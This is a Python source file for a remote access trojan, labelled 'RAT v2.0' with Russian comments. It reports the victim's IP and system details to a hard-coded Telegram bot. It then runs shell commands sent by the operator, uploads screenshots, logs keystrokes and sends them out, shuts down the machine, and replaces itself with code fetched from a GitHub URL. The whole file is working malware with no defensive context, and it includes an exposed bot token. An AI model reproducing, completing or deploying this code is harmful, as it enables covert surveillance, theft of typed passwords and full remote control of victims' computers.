# test build
import os
import sys
import time
import requests
import subprocess
import platform
import pyautogui
from pynput import keyboard

# ===== НАСТРОЙКИ =====
TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"
VERSION = "2.0"
REPO_URL = "https://raw.githubusercontent.com/popask223-create/Tracked/main/rat_mm2.py"

# ===== ОТПРАВКА В TELEGRAM =====
def send_tg(msg, file=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": msg}
        requests.post(url, json=data)
        if file:
            with open(file, 'rb') as f:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    data={"chat_id": CHAT_ID},
                    files={"document": f}
                )
    except:
        pass

# ===== СКРИНШОТ =====
def screenshot():
    try:
        path = "screen.png"
        pyautogui.screenshot().save(path)
        return path
    except:
        return None

# ===== ВЫПОЛНЕНИЕ КОМАНД =====
def execute_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return r.stdout + r.stderr
    except:
        return "Ошибка"

# ===== КЕЙЛОГГЕР =====
def keylogger():
    logs = ""
    def on_press(key):
        nonlocal logs
        try:
            logs += key.char
        except:
            logs += f"[{key}]"
        if len(logs) > 50:
            send_tg(f"⌨️ Кейлог: {logs}")
            logs = ""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ===== ОБНОВЛЕНИЕ =====
def check_update():
    try:
        r = requests.get(REPO_URL, timeout=5)
        if r.status_code == 200:
            new_code = r.text
            if "VERSION = \"2.1\"" in new_code and VERSION != "2.1":
                with open(__file__, 'w', encoding='utf-8') as f:
                    f.write(new_code)
                send_tg("🔄 Обновлено до версии 2.1. Перезапуск...")
                time.sleep(1)
                os.execl(sys.executable, sys.executable, *sys.argv)
    except:
        pass

# ===== ГЛАВНАЯ ФУНКЦИЯ =====
def main():
    send_tg(f"🖥️ RAT v{VERSION} запущен!\nIP: {requests.get('https://api.ipify.org').text}\nСистема: {platform.system()} {platform.release()}")

    while True:
        try:
            check_update()

            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            updates = requests.get(url).json()
            if updates['result']:
                last = updates['result'][-1]
                msg = last['message']['text']
                chat = last['message']['chat']['id']
                if str(chat) == CHAT_ID:
                    if msg.startswith('/cmd'):
                        out = execute_cmd(msg[5:])
                        send_tg(f"💻 Результат:\n{out[:4000]}")
                    elif msg == '/screen':
                        img = screenshot()
                        if img:
                            send_tg("📸 Скриншот:", img)
                            os.remove(img)
                        else:
                            send_tg("❌ Ошибка")
                    elif msg == '/shutdown':
                        execute_cmd("shutdown /s /t 5")
                        send_tg("💻 ПК выключится через 5 сек")
                    elif msg == '/altf4':
                        pyautogui.hotkey('alt', 'f4')
                        send_tg("⌨️ Alt+F4 отправлен")
            time.sleep(5)
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
